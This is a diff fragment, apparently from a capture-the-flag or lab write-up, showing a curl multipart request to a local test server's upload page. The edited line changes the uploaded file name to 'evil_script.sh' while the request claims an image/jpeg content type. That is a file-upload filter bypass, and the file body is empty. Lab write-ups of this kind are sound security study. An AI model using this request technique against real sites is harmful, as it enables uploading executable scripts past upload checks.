@@ -21,7 +21,7 @@ curl 'http://192.168.64.4/?page=upload' \
 -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8' \
 -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymFT7BcI67jE7pfyE' \
 -H 'Referer: http://192.168.64.4/?page=upload' \
---data-raw $'------WebKitFormBoundarymFT7BcI67jE7pfyE\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundarymFT7BcI67jE7pfyE\r\nContent-Disposition: form-data; name="uploaded"; filename=test.sumshit"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundarymFT7BcI67jE7pfyE\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n------WebKitFormBoundarymFT7BcI67jE7pfyE--\r\n' \
+--data-raw $'------WebKitFormBoundarymFT7BcI67jE7pfyE\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundarymFT7BcI67jE7pfyE\r\nContent-Disposition: form-data; name="uploaded"; filename=evil_script.sh"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundarymFT7BcI67jE7pfyE\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n------WebKitFormBoundarymFT7BcI67jE7pfyE--\r\n' \
 --compressed \
 --insecure
 ```
